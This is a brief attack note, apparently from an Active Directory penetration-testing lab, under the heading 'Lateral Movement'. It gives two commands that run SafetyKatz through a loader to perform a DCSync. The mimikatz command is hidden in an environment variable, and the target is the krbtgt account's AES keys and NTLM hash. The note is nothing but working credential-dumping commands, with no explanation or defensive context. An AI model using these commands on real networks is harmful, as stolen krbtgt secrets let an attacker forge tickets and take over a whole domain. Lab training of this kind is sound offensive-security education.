[[Lateral Movement]]
To get aes keys and ntlm hash of krbtgt account
```
echo %Pwn% -> lsadump::dcsync
```
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit"
```

 